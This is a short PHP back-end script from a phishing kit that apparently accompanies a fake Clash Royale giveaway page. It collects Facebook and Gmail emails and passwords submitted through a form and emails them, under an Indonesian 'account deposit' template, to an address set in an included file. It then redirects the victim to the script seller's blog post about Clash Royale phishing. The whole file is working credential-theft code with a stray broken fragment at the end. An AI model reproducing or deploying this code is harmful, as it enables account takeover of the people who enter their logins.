<?php 

$userfb    = $_POST['user'];
$passfb = $_POST['pass'];
$gmail   = $_POST['gmail'];
$pwg = $_POST['pwg'];


$body = "
-===¦ Akun Facebook ¦===-

|>> Email : ".$userfb."
|>> Password : ".$passfb."

-===¦ Akun Gmail ¦===-

|>> Email : ".$gmail."
|>> Password : ".$pwg."


-===¦ Thanks ¦===-

";

include 'emailmu.php';
$subject ="Setor Akun Si [".$userfb."]";
$headers ="From: Pulu-script.com <ngntd@bhaha>";
mail($emailku, $subject, $body, $headers);


$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>

<script>window.location.replace("https://www.pulu-script.com/2017/04/script-phising-clash-royale-spesial.html")</script>';}
}
?>